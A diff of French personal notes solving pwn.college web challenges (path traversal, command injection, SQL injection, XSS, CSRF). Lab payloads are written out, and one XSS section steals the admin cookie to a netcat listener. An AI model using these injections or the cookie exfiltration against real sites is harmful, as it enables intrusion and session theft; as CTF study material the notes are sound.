@@ -1,4 +1,36 @@
-**1. Path Traversal 1**
+# Notes personnelles — Vulnérabilités Web
+
+Notes de résolution sur des challenges pwn.college / labs persos, par catégorie de vulnérabilité.
+
+```mermaid
+mindmap
+  root((Vulnérabilités Web))
+    Path Traversal
+      Encodage %2F
+      Contournement strip
+    Command Injection
+      Quotes simples
+      Blind CMDi
+      Context breaking
+    SQL Injection
+      Classique
+      UNION-based
+      Boolean-based Blind
+    XSS
+      Stored
+      Exécution JS
+      Exfiltration cookie
+    CSRF
+      GET
+      POST
+      Double soumission
+    Auth Bypass
+      Cookie manipulation
+```
+
+---
+
+## 1. Path Traversal 1
 
 **Principe**  
 Le serveur construit le chemin comme ça :
@@ -21,7 +53,7 @@ Bash
 
 curl "http://challenge.localhost:80/\<route\>/..%2F..%2Fflag"
 
-**2. Path Traversal 2**
+## 2. Path Traversal 2
 
 **Principe**  
 Le développeur a ajouté :
@@ -45,7 +77,7 @@ Bash
 curl
 "http://challenge.localhost:80/\<route\>/fortunes/..%2F..%2F..%2Fflag"
 
-**3. Command Injection 1 (CMDi-1)**
+## 3. Command Injection 1 (CMDi-1)
 
 **Principe**
 
@@ -65,7 +97,7 @@ Bash
 curl
 "http://challenge.localhost:80/\<route\>?\<param\>=/challenge;cat+/flag"
 
-**4. Command Injection 2 (CMDi-2)**
+## 4. Command Injection 2 (CMDi-2)
 
 **Principe**  
 Le développeur filtre le ; :
@@ -94,7 +126,7 @@ La commande devient : ls -l / \| cat /flag
 **Flag obtenu** :  
 pwn.college{I7TgvdoLd2fUGJpHvbSkAYCitPE.QX0YTN2wyN2MDM5EzW}
 
-**Notes – CMDi 3**
+## Notes – CMDi 3
 
 **Principe**
 
@@ -162,7 +194,7 @@ ls -l '/';cat /flag''
 
 Il y a **toujours** une ' à la fin de la commande.
 
-**Notes – CMDi 4**
+## Notes – CMDi 4
 
 **Principe**
 
@@ -185,7 +217,7 @@ Bash
 
 curl "http://challenge.localhost:80/event?tzid=;cat+/flag"
 
-**Notes – CMDi 5 (Blind Command Injection)**
+## Notes – CMDi 5 (Blind Command Injection)
 
 **Principe**
 
@@ -218,7 +250,7 @@ curl
 
 cat /tmp/flag.txt
 
-**Notes – CMDi 6**
+## Notes – CMDi 6
 
 **Principe**
 
@@ -281,7 +313,7 @@ Bash
 
 curl "http://challenge.localhost:80/?session_user=admin"
 
-**Notes – Authentication Bypass 2**
+## Notes – Authentication Bypass 2
 
 **Principe**
 
@@ -306,9 +338,9 @@ Bash
 
 curl -b "session_user=admin" "http://challenge.localhost:80/"
 
-**Fiche de Révision : SQLi1**
+## Fiche de Révision : SQLi1
 
-**1. Contexte & Objectif**
+### 1. Contexte & Objectif
 
 - **Cible :** Application Flask lisant une base SQLite.
 
@@ -319,7 +351,7 @@ curl -b "session_user=admin" "http://challenge.localhost:80/"
   cookies chiffrés (impossibles à modifier directement).
   L'authentification doit donc être validée par la base de données.
 
-**2. Analyse de la Vulnérabilité (SQL Injection)**
+### 2. Analyse de la Vulnérabilité (SQL Injection)
 
 Le serveur construit sa requête SQL par simple concaténation de chaînes
 de caractères :
@@ -338,7 +370,7 @@ curl "http://challenge.localhost/identity" \\
 **Fiche de Révision : SQLi2 Injection (Champs Texte & Contournement
 d'Égalité)**
 
-**1. Contexte & Analyse du Code**
+### 1. Contexte & Analyse du Code
 
 Le serveur Flask exécute la requête suivante lors de la connexion :
 
@@ -368,7 +400,7 @@ if username == "admin":
 
 page += "\<br\>Here is your flag: " + open("/flag").read()
 
-**2. Piège Décelé : Injection via userid vs account-password**
+### 2. Piège Décelé : Injection via userid vs account-password
 
 - **Si l'injection se fait sur userid (ex: admin'--) :**
 
@@ -381,7 +413,7 @@ flask.session\["user"\] enregistre "admin'--". Le check username ==
 Garder userid = admin (pour que la session stocke exactement "admin") et
 injecter le payload dans le champ account-password.
 
-**3. Construction du Payload SQL**
+### 3. Construction du Payload SQL
 
 En envoyant :
 
@@ -396,7 +428,7 @@ SQL
 SELECT rowid, \* FROM users WHERE username = 'admin' AND password = ''
 OR '1'='1'
 
-**Évaluation par le moteur SQL :**
+### Évaluation par le moteur SQL :
 
 1.  L'opérateur AND est prioritaire sur OR.
 
@@ -408,7 +440,7 @@ OR '1'='1'
 4.  La ligne de l'utilisateur admin est retournée par la base de
     données.
 
-**4. Commandes de Résolution**
+### 4. Commandes de Résolution
 
 1.  **Envoi de l'injection sur le champ mot de passe :**
 
@@ -436,9 +468,9 @@ curl "http://challenge.localhost/logon" \\
 
 Voici la fiche de récapitulatif pour ce troisième niveau.
 
-**Fiche de Révision : Injection SQLi3 de type UNION**
+## Fiche de Révision : Injection SQLi3 de type UNION
 
-**1. Contexte & Analyse du Code**
+### 1. Contexte & Analyse du Code
 
 Dans ce niveau, l'application recherche un utilisateur et affiche le
 résultat directement sur la page :
@@ -456,12 +488,12 @@ sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
 - **Problème :** Une simple clause OR 1=1 afficherait les noms
   d'utilisateurs, mais pas leurs mots de passe.
 
-**2. Principe de l'Injection UNION**
+### 2. Principe de l'Injection UNION
 
 L'opérateur SQL UNION permet de combiner les résultats de deux requêtes
 SELECT distinctes en un seul jeu de données.
 
-**Règles d'une requête UNION :**
+### Règles d'une requête UNION :
 
 1.  Les deux requêtes doivent retourner le **même nombre de colonnes**.
 
@@ -472,7 +504,7 @@ Comme la requête initiale sélectionne 1 seule colonne (username), la
 deuxième requête du UNION doit également sélectionner 1 seule colonne
 (password).
 
-**3. Construction du Payload**
+### 3. Construction du Payload
 
 - **Entrée :** " UNION SELECT password FROM users --
 
@@ -483,7 +515,7 @@ SQL
 SELECT username FROM users WHERE username LIKE "" UNION SELECT password
 FROM users --"
 
-**Décomposition du payload :**
+### Décomposition du payload :
 
 - " : Ferme le guillemet double entourant la variable \$query.
 
@@ -493,7 +525,7 @@ FROM users --"
 - -- : Commente le reste de la requête originale pour éviter une erreur
   de syntaxe SQL.
 
-**4. Commande de Résolution**
+### 4. Commande de Résolution
 
 Bash
 
@@ -503,9 +535,9 @@ curl
 
 -H "Host: challenge.localhost"
 
-**SQLi4**
+## SQLi4
 
-**Step 1: Extract the Randomized Table Name**
+### Step 1: Extract the Randomized Table Name
 
 SQLite automatically maintains a schema table called sqlite_master (or
 sqlite_schema) that contains metadata about all tables in the database.
@@ -518,7 +550,7 @@ Plaintext
 
 " UNION SELECT tbl_name FROM sqlite_master --
 
-**Execute the request:**
+### Execute the request:
 
 Bash
 
@@ -531,7 +563,7 @@ curl
 The output in the \<pre\> section will reveal the randomized table name
 (e.g., users_8589934592).
 
-**Step 2: Extract the Flag from the Discovered Table**
+### Step 2: Extract the Flag from the Discovered Table
 
 Once you have the table name (let's assume users_12345678), inject a
 second UNION SELECT query targeting that specific table name to extract
@@ -550,9 +582,9 @@ curl
 
 SQLi5
 
-**Fiche de Révision : Blind SQL Injection (Basée sur les booléens)**
+## Fiche de Révision : Blind SQL Injection (Basée sur les booléens)
 
-**1. Contexte & Problématique**
+### 1. Contexte & Problématique
 
 - **Contrainte :** L'application ne renvoie **aucun résultat SQL** à
   l'écran.
@@ -569,7 +601,7 @@ SQLi5
   admin) caractère par caractère en posant des questions Vrai/Faux à la
   base de données.
 
-**2. Principe du Boolean-Based Blind SQLi**
+### 2. Principe du Boolean-Based Blind SQLi
 
 On reconstruit une requête dont le résultat dépend d'une condition
 booléenne :
@@ -587,7 +619,7 @@ OR (username='admin' AND substr(password, 1, 1)='p') --'
   base ne renvoie aucune ligne. Le serveur Flask répond avec un code
   403.
 
-**3. Fonctions Clés SQLite**
+### 3. Fonctions Clés SQLite
 
 - SUBSTR(chaine, position, longueur) : Extrait une sous-chaîne à partir
   d'un index basé sur 1 (ex: substr(password, 1, 1) extrait le premier
@@ -596,7 +628,7 @@ OR (username='admin' AND substr(password, 1, 1)='p') --'
 - LENGTH(chaine) : Renvoie la longueur de la chaîne (utile pour
   connaître la taille exacte avant l'extraction).
 
-**4. Script d'Exploitation (Automation Python)**
+### 4. Script d'Exploitation (Automation Python)
 
 Python
 
@@ -646,9 +678,9 @@ if not found_char:
 
 break
 
-**Fiche de Révision : Stored XSS (Cross-Site Scripting Stocké)**
+## Fiche de Révision : Stored XSS (Cross-Site Scripting Stocké)
 
-**1. Contexte & Problématique**
+### 1. Contexte & Problématique
 
 - **Changement de Paradigme :** Contrairement aux injections SQL ou de
   commandes où la cible est le serveur Web, l'XSS vise **le navigateur
@@ -659,7 +691,7 @@ break
   base de données du serveur. Chaque fois qu'un utilisateur consulte la
   page, le serveur lui sert ce contenu malveillant.
 
-**2. Analyse de la Vulnérabilité du Code Source**
+### 2. Analyse de la Vulnérabilité du Code Source
 
 Dans /challenge/server :
 
@@ -679,7 +711,7 @@ page += "\<hr\>" + post\["content"\] + "\n"
   code HTML valide au lieu de la convertir en texte brut (absence
   d'échappement des caractères spéciaux comme \< et \>).
 
-**3. Méthodologie d'Exploitation**
+### 3. Méthodologie d'Exploitation
 
 - **Condition de réussite du challenge :** Faire en sorte que le script
   victime voie **3 zones de texte** (\<input type="text"\>) lors de sa
@@ -695,7 +727,7 @@ HTML
 - **Attaque :** Envoyer **2 posts supplémentaires** contenant chacun une
   balise HTML \<input type='text'\>.
 
-**4. Commandes de Résolution**
+### 4. Commandes de Résolution
 
 1.  **Lancement du serveur (si besoin) :**
 
@@ -725,9 +757,9 @@ Bash
 
 /challenge/victim "http://challenge.localhost/"
 
-**Fiche de Révision : Execution de Code JavaScript (Stored XSS)**
+## Fiche de Révision : Execution de Code JavaScript (Stored XSS)
 
-**1. Contexte & Définition**
+### 1. Contexte & Définition
 
 - **Évolution par rapport au niveau 1 :** Au lieu d'injecter de simples
   balises de structure HTML (comme des zones de texte \<input\>),
@@ -737,7 +769,7 @@ Bash
   Web que le contenu interne doit être interprété et exécuté en tant que
   code exécutable (JavaScript).
 
-**2. Analyse de la Vulnérabilité**
+### 2. Analyse de la Vulnérabilité
 
 Dans /challenge/server :
 
@@ -757,7 +789,7 @@ HTML
 
 \<hr\>\<script\>alert("PWNED")\</script\>
 
-**3. Méthodologie d'Exploitation**
+### 3. Méthodologie d'Exploitation
 
 - **Payload utilisé :**
 
@@ -768,7 +800,7 @@ HTML
 - **Impact :** La fonction JavaScript alert() est appelée lors du rendu
   du document HTML dans le navigateur de la victime (/challenge/victim).
 
-**4. Commandes de Résolution**
+### 4. Commandes de Résolution
 
 1.  **Injection du payload XSS :**
 
@@ -786,7 +818,7 @@ Bash
 
 /challenge/victim "http://challenge.localhost/"
 
-**2. Analyse de la Vulnérabilité**
+### 2. Analyse de la Vulnérabilité
 
 Dans /challenge/server :
 
@@ -812,7 +844,7 @@ The message:
   msg directement depuis l'URL de la requête HTTP et la concatène dans
   la réponse HTML sans aucun nettoyage ni échappement.
 
-**3. Méthodologie d'Exploitation**
+### 3. Méthodologie d'Exploitation
 
 - **Payload brut :** \<script\>alert("PWNED")\</script\>
 
@@ -826,7 +858,7 @@ Plaintext
 
 http://challenge.localhost/?msg=%3Cscript%3Ealert(%22PWNED%22)%3C/script%3E
 
-**4. Commande de Résolution**
+### 4. Commande de Résolution
 
 Déclenchement du Bot Victime en lui fournissant l'URL piégée en
 paramètre :
@@ -839,7 +871,7 @@ Bash
 **Fiche de Révision : Sortie de Contexte HTML (Context Breaking in
 XSS)**
 
-**1. Problématique du Contexte**
+### 1. Problématique du Contexte
 
 En sécurité Web, le contexte détermine la façon dont le navigateur
 interprète les données injectées :
@@ -853,7 +885,7 @@ interprète les données injectées :
   ne s'exécutera pas car le navigateur considère qu'elle fait partie de
   la valeur du champ de texte.
 
-**2. Analyse de la Vulnérabilité du Code Source**
+### 2. Analyse de la Vulnérabilité du Code Source
 
 Dans /challenge/server :
 
@@ -887,7 +919,7 @@ here!")}\</textarea\>
 - **Le problème :** L'entrée utilisateur est directement reflétée **à
   l'intérieur** des balises \<textarea\> et \</textarea\>.
 
-**3. Technique d'Attaque : Cassage de Contexte (Context Breaking)**
+### 3. Technique d'Attaque : Cassage de Contexte (Context Breaking)
 
 Pour exécuter du JavaScript, l'attaque se déroule en deux étapes :
 
@@ -912,7 +944,7 @@ name=msg\>\</textarea\>\<script\>alert("PWNED")\</script\>\</textarea\>
 *(Le navigateur ferme la zone de texte au premier \</textarea\>
 rencontré, puis exécute le script).*
 
-**4. Commande de Résolution**
+### 4. Commande de Résolution
 
 Lancement de la commande avec l'URL contenant la charge encodée :
 
@@ -926,7 +958,7 @@ Voici la fiche de récapitulatif pour ce sixième niveau d'XSS.
 **Fiche de Révision : Modification d'État via Requêtes HTTP POST (Fetch
 API)**
 
-**1. Évolution du Vecteur d'Attaque**
+### 1. Évolution du Vecteur d'Attaque
 
 - **GET vs POST :** Dans les applications web sécurisées, les actions
   modifiant l'état (création, mise à jour, suppression) doivent utiliser
@@ -938,7 +970,7 @@ API)**
   accès réseau que l'utilisateur. L'API fetch() de JavaScript permet
   d'effectuer tous les types de requêtes HTTP (GET, POST, PUT, DELETE).
 
-**2. Analyse du Code Source Vulnerable**
+### 2. Analyse du Code Source Vulnerable
 
 Dans /challenge/server :
 
@@ -964,7 +996,7 @@ return flask.redirect("/")
   conséquent, toute requête POST émise depuis le navigateur d'un
   utilisateur connecté sera acceptée et exécutée.
 
-**3. Structure du Payload Fetch POST**
+### 3. Structure du Payload Fetch POST
 
 Par défaut, fetch(url) envoie une requête GET. Pour envoyer une requête
 POST, on spécifie les options de la requête :
@@ -981,7 +1013,7 @@ method: 'POST'
 
 \</script\>
 
-**4. Déroulement Complet de l'Attaque**
+### 4. Déroulement Complet de l'Attaque
 
 1.  **Connexion :** Récupération d'une session valide pour le compte
     hacker.
@@ -999,7 +1031,7 @@ method: 'POST'
 5.  **Extraction :** Récupération du drapeau depuis la page d'accueil
     avec le cookie du compte hacker.
 
-**5. Commandes de Résolution**
+### 5. Commandes de Résolution
 
 Bash
 
@@ -1035,9 +1067,9 @@ associé au fetch() en **POST vers 0.0.0.0:6969** était la clé absolue
 pour contourner les problèmes d'interprétation des caractères spéciaux
 par curl et la politique réseau du navigateur.
 
-**Fiche de Révision : Stored XSS & Exfiltration (pwn.college xss-7)**
+## Fiche de Révision : Stored XSS & Exfiltration (pwn.college xss-7)
 
-**1. Pourquoi l'attaque a fonctionné (Analyse du Payload gagnant)**
+### 1. Pourquoi l'attaque a fonctionné (Analyse du Payload gagnant)
 
 Bash
 
@@ -1065,7 +1097,7 @@ curl -s -b cookies.txt -X POST "http://challenge.localhost/draft" \\
   de la requête (body) évite que le cookie soit rejeté ou découpé par
   les règles d'URL/Query parameters de la requête GET.
 
-**2. Anatomie de l'Exfiltration via Netcat**
+### 2. Anatomie de l'Exfiltration via Netcat
 
 When nc -lvnp 6969 a reçu la connexion :
 
@@ -1087,7 +1119,7 @@ Origin: http://challenge.localhost
 
 auth=admin\|.QXygTN2wyN2MDM5EzW}
 
-**3. Reconstitution du Cookie et Usurpation d'Identité**
+### 3. Reconstitution du Cookie et Usurpation d'Identité
 
 Une fois le secret extrait (auth=admin\|.QXygTN2wyN2MDM5EzW}), il
 suffisait de rejouer la requête d'accès sous l'identité de
@@ -1109,15 +1141,15 @@ pwn.college{MRMFYOmxRWa_d5ESIYJ0NgRtzvC.QXygTN2wyN2MDM5EzW}
 Voici une fiche de récapitulatif synthétique pour le laboratoire **CSRF
 Level 1**.
 
-**📌 Fiche de Synthèse : CSRF Level 1**
+## 📌 Fiche de Synthèse : CSRF Level 1
 
-**🎯 Objectif du Challenge**
+### 🎯 Objectif du Challenge
 
 Forcer l'administrateur du site (admin) à effectuer une action
 privilégiée — **publier son brouillon secret contenant le drapeau** via
 la route /publish — à son insu lorsqu'il visite notre site malveillant.
 
-**🔍 Éléments Clés & Vulnérabilités**
+### 🔍 Éléments Clés & Vulnérabilités
 
 1.  **Absence de jeton anti-CSRF**
 
@@ -1141,9 +1173,9 @@ la route /publish — à son insu lorsqu'il visite notre site malveillant.
       sont considérées comme des navigations de premier niveau et
       transmettent le cookie de session, renvoyant un statut 302 Found.
 
-**🛠️ Étapes d'Exploitation (Kill Chain)**
+### 🛠️ Étapes d'Exploitation (Kill Chain)
 
-**1. Préparation du Payload HTML (sur le serveur de l'attaquant)**
+### 1. Préparation du Payload HTML (sur le serveur de l'attaquant)
 
 Fichier index.html hébergé sur
 \[http://hacker.localhost:1337/\](http://hacker.localhost:1337/) :
@@ -1169,7 +1201,7 @@ window.location.href = "http://challenge.localhost/publish";
 
 \</html\>
 
-**2. Démarrage du serveur et déclenchement de la victime**
+### 2. Démarrage du serveur et déclenchement de la victime
 
 Bash
 
@@ -1181,7 +1213,7 @@ python3 -m http.server 1337 --bind 0.0.0.0 &
 
 /challenge/victim "http://hacker.localhost:1337/"
 
-**3. Récupération du Drapeau**
+### 3. Récupération du Drapeau
 
 Une fois l'admin redirigé sur /publish, son brouillon est publié sur
 l'application. Il suffit d'ouvrir une session utilisateur (hacker) pour
@@ -1203,9 +1235,9 @@ curl -s -b cookies.txt "http://challenge.localhost/" \\
 
 -H "Host: challenge.localhost" \| grep -oE "pwn.college\\\[^}\]+\\"
 
-**Fiche de Révision : POST-CSRF (pwn.college csrf-2)**
+## Fiche de Révision : POST-CSRF (pwn.college csrf-2)
 
-**1. Pourquoi l'attaque a fonctionné (Analyse du Payload)**
+### 1. Pourquoi l'attaque a fonctionné (Analyse du Payload)
 
 HTML
 
@@ -1247,7 +1279,7 @@ document.getElementById('csrfForm').submit();
   navigateur du bot à soumettre le formulaire immédiatement au
   chargement de la page sans nécessiter d'interaction utilisateur.
 
-**2. Déroulement du journal des requêtes**
+### 2. Déroulement du journal des requêtes
 
 1.  Le bot visite le site attaquant : GET / HTTP/1.1 (port 1337).
 
@@ -1262,7 +1294,7 @@ document.getElementById('csrfForm').submit();
 5.  Connexion avec le compte hacker et extraction du flag sur l'accueil
     authentifié.
 
-**✅ Solution CSRF 3**
+## ✅ Solution CSRF 3
 
 Le principe est simplement :
 
@@ -1334,7 +1366,7 @@ Le hint officiel explique précisément pourquoi : si tu écris directement
 navigateur peut considérer ce \</script\> comme la fermeture de ton
 propre script.
 
-**🚀 Ensuite**
+## 🚀 Ensuite
 
 Lance le serveur :
 
